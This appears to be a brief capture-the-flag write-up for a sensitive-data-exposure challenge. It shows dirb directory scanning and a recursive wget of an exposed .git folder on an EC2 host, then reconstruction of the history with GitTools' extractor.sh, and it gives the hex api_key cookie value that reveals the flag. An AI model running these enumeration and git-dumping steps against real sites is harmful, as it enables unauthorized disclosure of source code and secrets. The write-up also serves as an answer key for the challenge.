# 1 SEP 2021 | sesnstive data exposure 



visitng site and reading source code doesn't help alot 

![image](https://user-images.githubusercontent.com/67979878/131711020-88a17436-db7c-4419-bf76-b6c401d7a8bd.png)

![image](https://user-images.githubusercontent.com/67979878/131711040-f998bc72-ecda-4b5f-aafc-7279c7dd08d5.png)


`dirb  http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/comrade/`

found .git file let's download it :

`wget -r http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/comrade/.git/`


i am too lazy to go around and see each file so i use extractor.sh script from Git_tools 

`$ bash extractor.sh ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/comrade/  . `


there are 2 commits let's check them :

![image](https://user-images.githubusercontent.com/67979878/131711364-e8ddf24a-493b-41b1-9fa8-76d8acd7453c.png)


![image](https://user-images.githubusercontent.com/67979878/131711431-a5be27b7-3a08-4906-877b-be6e4fa5fee6.png)

````
so flag will be printed on /api.php only if a cookie api_key is set and equal to $apikey variable

from access.php we see $apikey=$access 

$access is in contact_process.php

````
![image](https://user-images.githubusercontent.com/67979878/131711808-8725d040-0a4b-4722-b236-9ab60a95ead5.png)

`$access = bin2hex('this_is_top_secret');`

let's compile it : 

![image](https://user-images.githubusercontent.com/67979878/131712066-43bd1c99-6699-4fb7-987a-776e9d0dae4c.png)

so :`api_key= 746869735f69735f746f705f736563726574`

![image](https://user-images.githubusercontent.com/67979878/131712166-05c5a14f-5dbb-44ce-b286-4b21831d6746.png)

